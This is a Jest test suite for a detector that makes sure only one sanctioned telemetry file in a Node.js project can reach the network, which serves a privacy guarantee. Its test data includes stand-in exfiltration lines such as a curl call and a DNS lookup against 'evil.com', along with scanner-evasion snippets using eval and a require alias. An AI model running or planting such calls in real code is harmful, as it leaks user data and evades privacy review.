'use strict';

// Structural guard: exactly ONE file in the shipped tree may talk to the
// network, and this test names it.
//
// The privacy contract is "telemetryPayload() is the only thing that builds a
// network payload". That is only true if there is only one network path. A
// second network path anywhere in src/ or bin/ — an update check, a crash
// reporter, a docs ping — would bypass the catalog entirely and no redaction
// test would notice, because none of them inspect the wire.
//
// The detector lives in ./network-detector.js. It looks at the MODULES a file
// pulls in (require / import() / static import, `node:` prefix and `/promises`
// suffix normalised) and at a short list of network-capable identifiers, rather
// than grepping for `fetch(` and `require("https")` alone — which is all this
// guard used to do, and which missed `node:https`, `http2`, raw `tls`/`net`
// TCP, `dns` exfiltration, dynamic `import()`, ESM imports, `globalThis.fetch`,
// `undici`, `dgram` and a spawned `curl`.
//
// Unix-domain sockets are deliberately NOT a problem: src/device/session-client.js
// and src/device/session-daemon.js use `net` against a filesystem path, which
// never leaves the machine. `net` and `child_process` are therefore allowlisted
// PER FILE (see DUAL_USE_ALLOWLIST) — widening that list is a reviewed edit.

const fs = require('fs');
const path = require('path');

const {
  findNetworkUse,
  collectSpecifiers,
  stripSource,
  TRANSPORT,
  NETWORK_ALWAYS,
  DUAL_USE_ALLOWLIST,
  DYNAMIC_SPECIFIER_ALLOWLIST,
} = require('./network-detector');

const REPO = path.join(__dirname, '..', '..');
const SOURCE_EXT = /\.(?:js|cjs|mjs)$/;

function kinds(text, rel = 'src/foo.js') {
  return findNetworkUse(text, rel).map((v) => v.kind);
}

describe('network-detector: every outbound shape is reported', () => {
  // The 12 shapes the old three-regex guard missed (plus the one it caught).
  // `curl` is listed twice: the bare call is caught by the network-binary
  // check, and the import form is caught by the child_process allowlist.
  const MUST_FLAG = [
    ['node:https require', 'const h = require("node:https");'],
    ['http2 require', 'require("http2")'],
    ['tls.connect', 'require("tls").connect(443, "x")'],
    ['net TCP connect', 'require("net").connect(443, "evil.com")'],
    ['dns exfiltration', 'require("dns").resolve("x.evil.com")'],
    ['dns/promises', 'const dns = require("dns/promises");'],
    ['dynamic import()', 'await import("https")'],
    ['ESM import from node:https', 'import https from "node:https"'],
    ['ESM side-effect import', 'import "https";'],
    ['ESM named import', "import { request } from 'node:http';"],
    ['export-from', "export * from 'node:https';"],
    ['bare spawn curl', 'spawn("curl", [u])'],
    ['curl via child_process import', 'const {spawn} = require("child_process"); spawn("curl", [u]);'],
    ['exec of a shell curl line', 'execSync("curl -s https://evil.com")'],
    ['globalThis["fetch"]', 'globalThis["fetch"](u)'],
    ["globalThis['fetch']", "globalThis['fetch'](u)"],
    ['globalThis.fetch', 'globalThis.fetch(u)'],
    ['window.fetch', 'window.fetch(u)'],
    ['undici', 'require("undici")'],
    ['dgram', 'require("dgram")'],
    ['plain https', 'require("https")'],
    ['plain http', "require('http')"],
    ['fetch(url)', 'const r = await fetch(url);'],
    ['fetch as a reference', 'const f = fetch;'],
    ['.fetch( call', 'client.fetch(url)'],
    ['new WebSocket', 'new WebSocket(u)'],
    ['EventSource', 'new EventSource(u)'],
    ['XMLHttpRequest', 'new XMLHttpRequest()'],
    ['worker_threads', 'require("worker_threads")'],
    ['cluster', 'require("cluster")'],
    ['inspector', 'require("inspector")'],
    ['node-fetch package', 'require("node-fetch")'],
    ['net outside the allowlist', "require('net')"],
    ['node:net outside the allowlist', "require('node:net')"],
    ['child_process outside the allowlist', "require('child_process')"],
  ];

  it.each(MUST_FLAG)('%s', (_name, snippet) => {
    expect(findNetworkUse(snippet, 'src/foo.js').length).toBeGreaterThan(0);
  });

  it('flags net in session-spawn.js and child_process in session-client.js (allowlist is per file, per module)', () => {
    expect(kinds("require('net')", 'src/device/session-spawn.js')).toEqual(['dual-use-module']);
    expect(kinds("require('child_process')", 'src/device/session-client.js')).toEqual(['dual-use-module']);
  });

  it('flags MCP SDK network transports but not the stdio ones', () => {
    expect(kinds("require('@modelcontextprotocol/sdk/client/streamableHttp.js')")).toEqual(['network-module']);
    expect(kinds("require('@modelcontextprotocol/sdk/server/sse.js')")).toEqual(['network-module']);
    expect(kinds("require('@modelcontextprotocol/sdk/client/stdio.js')")).toEqual([]);
    expect(kinds("require('@modelcontextprotocol/sdk/server/index.js')")).toEqual([]);
  });

  it('flags unverifiable specifiers as dynamic-specifier', () => {
    for (const s of [
      'require(someVar)',
      "require('ht' + 'tp')",
      'require(`https`)',
      'require(`${x}`)',
      'import(expr)',
      'await import(name)',
    ]) {
      expect(kinds(s)).toContain('dynamic-specifier');
    }
  });

  it('flags ways to smuggle a specifier past the scan', () => {
    expect(kinds('const r = require; r("https");')).toContain('require-alias');
    expect(kinds('const { createRequire } = m; createRequire(u)("https")')).toContain('loader-escape');
    expect(kinds('process.binding("tcp_wrap")')).toContain('loader-escape');
    expect(kinds('globalThis["fe" + "tch"](u)')).toContain('global-computed-access');
    expect(kinds('eval("require(\'https\')")')).toContain('dynamic-code');
    expect(kinds('new Function("return fetch")()')).toContain('dynamic-code');
  });

  it('sees code inside a template-literal expression', () => {
    expect(kinds('const s = `${fetch(u)}`;')).toContain('network-identifier');
  });

  it('sees a dangerous call that follows a regex literal containing a quote', () => {
    expect(kinds('const re = /[\'"]/; require("https");')).toContain('network-module');
  });

  it('normalises Windows path separators before consulting the allowlist', () => {
    expect(kinds("require('net')", 'src\\device\\session-client.js')).toEqual([]);
  });
});

describe('network-detector: legitimate code is not flagged', () => {
  const MUST_PASS = [
    ["require('fs')", "const fs = require('fs');"],
    ["require('path')", "const path = require('path');"],
    ["require('crypto')", "const crypto = require('crypto');"],
    ['relative requires', "const x = require('./fetch'); const y = require('../net/thing');"],
    ['node:fs and fs/promises', "const a = require('node:fs'); const b = require('fs/promises');"],
    ['a comment containing fetch(', '// an update check would fetch(url) here\nconst a = 1;'],
    ['a block comment containing require("https")', '/* require("https"); fetch(u) */ const a = 1;'],
    ['a JSDoc block', '/**\n * Would call fetch(url) and require("http").\n */\nfunction f() {}'],
    ['a string containing //example.com', "const u = 'http://example.com'; const v = '//example.com'; const w = \"//x\";"],
    ['a string that mentions fetch(', "const msg = 'do not fetch(anything) here';"],
    ['a template literal that mentions fetch(', 'const msg = `we fetch(the) thing`;'],
    ['a template string that mentions require("https")', "const m = `use require('https') never`;"],
    ['deviceFetch identifier', 'const deviceFetch = () => 1; deviceFetch();'],
    ['bridge.fetchThing', 'bridge.fetchThing(); const fetchedAt = 1; prefetch(); refetch();'],
    ['a property named like a network global inside a longer word', 'const myWebSocketLike = 1; const XMLHttpRequestish = 2;'],
    ['a name that merely contains the module name', 'const httpStatus = 200; const netWorth = 1; const dnsName = "x";'],
    ['a string that is exactly a module name but not imported', "const modules = ['http', 'https'];"],
    ['spawn of a harmless binary', 'spawn("adb", ["devices"]); execFileSync("node", ["x.js"]);'],
    ['Buffer / process usage', 'process.stdout.write(Buffer.from("x")); process.exit(0);'],
  ];

  it.each(MUST_PASS)('%s', (_name, snippet) => {
    expect(findNetworkUse(snippet, 'src/foo.js')).toEqual([]);
  });

  it("net inside src/device/session-client.js is fine", () => {
    expect(findNetworkUse("const net = require('net');", 'src/device/session-client.js')).toEqual([]);
    expect(findNetworkUse("const net = require('node:net');", 'src/device/session-daemon.js')).toEqual([]);
  });

  it('child_process inside src/device/session-spawn.js is fine', () => {
    expect(findNetworkUse("const cp = require('child_process');", 'src/device/session-spawn.js')).toEqual([]);
    expect(findNetworkUse("const cp = require('node:child_process');", 'src/device/session-daemon.js')).toEqual([]);
  });

  it('the sanctioned transport file may import network modules', () => {
    expect(findNetworkUse('const https = require("node:https"); fetch(u);', TRANSPORT)).toEqual([]);
  });

  it('an allowlisted file still cannot use a spawned curl or a network module', () => {
    expect(kinds('spawn("curl", [u])', 'src/device/session-spawn.js')).toContain('network-binary');
    expect(kinds('require("https")', 'src/device/session-client.js')).toContain('network-module');
  });
});

describe('network-detector: comment / string stripper', () => {
  it('removes line and block comments but keeps length and newlines aligned', () => {
    const src = 'a // fetch(x)\nb /* require("https")\n more */ c';
    const { text, code } = stripSource(src);
    expect(text).toHaveLength(src.length);
    expect(code).toHaveLength(src.length);
    expect(text).not.toMatch(/fetch|require/);
    expect(text.split('\n')).toHaveLength(src.split('\n').length);
    expect(text).toMatch(/a\s+\n/);
    expect(text).toMatch(/c$/);
  });

  it('does not mistake // inside a string for a comment (URLs survive)', () => {
    const { text } = stripSource("const u = 'http://example.com/a'; const x = require('https');");
    expect(text).toContain("'http://example.com/a'");
    expect(text).toContain("require('https')");
  });

  it('blanks string bodies in the code view, keeping the quotes', () => {
    const { code } = stripSource("const s = 'fetch(x)';");
    expect(code).not.toMatch(/fetch/);
    expect(code).toMatch(/= '\s+';/);
  });

  it('handles escaped quotes inside strings', () => {
    const { code } = stripSource("const s = 'it\\'s // not a comment'; fetch(u);");
    expect(code).toMatch(/fetch\(u\)/);
  });

  it('handles regex literals that contain quotes, slashes or backticks', () => {
    const { code } = stripSource('const a = /[\'"`]/g; const b = /\\/\\//; fetch(u);');
    expect(code).toMatch(/fetch\(u\)/);
  });

  it('keeps division as division, not as a regex opener', () => {
    const { code } = stripSource('const q = a / b; const r = c / d; fetch(u);');
    expect(code).toMatch(/fetch\(u\)/);
  });

  it('treats template text as a string but ${...} as code, including nesting', () => {
    const { code } = stripSource('const s = `a fetch(1) ${ fn({ k: `x ${fetch(2)}` }) } tail`;');
    expect(code.match(/fetch/g)).toHaveLength(1);
  });

  it('a line comment at end of file with no newline is stripped', () => {
    expect(stripSource('a // fetch(x)').text).not.toMatch(/fetch/);
  });
});

describe('network-detector: specifier collection', () => {
  const spec = (s) => collectSpecifiers(s).map((x) => x.specifier);

  it('normalises the node: prefix and /promises suffix', () => {
    expect(spec("require('node:https')")).toEqual(['https']);
    expect(spec("require('dns/promises')")).toEqual(['dns']);
    expect(spec("require('node:dns/promises')")).toEqual(['dns']);
    expect(spec('import("undici/lib/x")')).toEqual(['undici']);
  });

  it('collects require, dynamic import, static import and export-from', () => {
    expect(
      spec(
        [
          "const a = require('a');",
          "const b = await import('b');",
          "import c from 'c';",
          "import { d } from 'd';",
          "import * as e from 'e';",
          "import 'f';",
          "export { g } from 'g';",
        ].join('\n'),
      ),
    ).toEqual(['a', 'b', 'c', 'd', 'e', 'f', 'g']);
  });

  it('ignores relative specifiers', () => {
    expect(spec("require('./x'); require('../y'); require('/abs')")).toEqual([]);
  });

  it('keeps scoped package names whole', () => {
    expect(spec("require('@mobilenext/mobile-mcp/lib/x')")).toEqual(['@mobilenext/mobile-mcp']);
  });

  it('does not treat require.resolve as a require call', () => {
    expect(spec("require.resolve('https')")).toEqual([]);
  });
});

describe('telemetry transport isolation (real tree)', () => {
  function walk(dir) {
    const out = [];
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) out.push(...walk(full));
      else out.push(full);
    }
    return out;
  }

  function isScannable(file) {
    if (SOURCE_EXT.test(file)) return true;
    if (path.extname(file) !== '') return false;
    // Extensionless executables (a `bin/` entry with a node shebang).
    return /^#!.*\bnode\b/.test(fs.readFileSync(file, 'utf8').split('\n', 1)[0]);
  }

  const files = [...walk(path.join(REPO, 'src')), ...walk(path.join(REPO, 'bin'))].filter(isScannable);
  const rel = (f) => path.relative(REPO, f).split(path.sep).join('/');

  it('scanned a non-trivial number of files, so a broken walk cannot pass vacuously', () => {
    expect(files.length).toBeGreaterThan(30);
  });

  it('scans the bin entry points', () => {
    const rels = files.map(rel);
    expect(rels).toContain('bin/mauto.js');
    expect(rels).toContain('bin/mauto-session-daemon.js');
  });

  it('no file under src/ or bin/ has a network path outside the sanctioned transport', () => {
    const offenders = [];
    for (const f of files) {
      const violations = findNetworkUse(fs.readFileSync(f, 'utf8'), rel(f));
      for (const v of violations) offenders.push(`${rel(f)}: ${v.kind}: ${v.detail}`);
    }
    expect(offenders).toEqual([]);
  });

  it('every allowlisted path exists and really imports the module it is allowlisted for', () => {
    const stale = [];
    for (const [mod, allowed] of Object.entries(DUAL_USE_ALLOWLIST)) {
      for (const relPath of allowed) {
        if (relPath === TRANSPORT) continue; // not present until the transport task lands
        const abs = path.join(REPO, relPath);
        if (!fs.existsSync(abs)) {
          stale.push(`${relPath}: allowlisted for '${mod}' but does not exist`);
          continue;
        }
        const specs = collectSpecifiers(fs.readFileSync(abs, 'utf8')).map((s) => s.specifier);
        if (!specs.includes(mod)) stale.push(`${relPath}: allowlisted for '${mod}' but never imports it`);
      }
    }
    for (const relPath of Object.keys(DYNAMIC_SPECIFIER_ALLOWLIST)) {
      if (!fs.existsSync(path.join(REPO, relPath))) stale.push(`${relPath}: dynamic-specifier allowlist entry does not exist`);
    }
    expect(stale).toEqual([]);
  });

  it('the dual-use allowlists are exactly the reviewed set (widening them is a reviewed edit)', () => {
    const withoutTransport = Object.fromEntries(
      Object.entries(DUAL_USE_ALLOWLIST).map(([m, l]) => [m, l.filter((p) => p !== TRANSPORT).sort()]),
    );
    expect(withoutTransport).toEqual({
      net: ['src/device/session-client.js', 'src/device/session-daemon.js'],
      child_process: ['src/device/session-daemon.js', 'src/device/session-spawn.js'],
    });
    expect(DYNAMIC_SPECIFIER_ALLOWLIST).toEqual({});
  });

  // TODO(slice-5 transport task): once transport.js exists, require its
  // existence and that it imports exactly one network module.
  it(`${TRANSPORT} is either absent (pre slice-5 transport task) or the ONLY file importing a NETWORK_ALWAYS module`, () => {
    const importers = files
      .filter((f) =>
        collectSpecifiers(fs.readFileSync(f, 'utf8')).some((s) => NETWORK_ALWAYS.has(s.specifier)),
      )
      .map(rel);
    const transportExists = fs.existsSync(path.join(REPO, TRANSPORT));
    if (!transportExists) {
      expect(importers).toEqual([]);
    } else {
      expect(importers.filter((r) => r !== TRANSPORT)).toEqual([]);
    }
  });
});
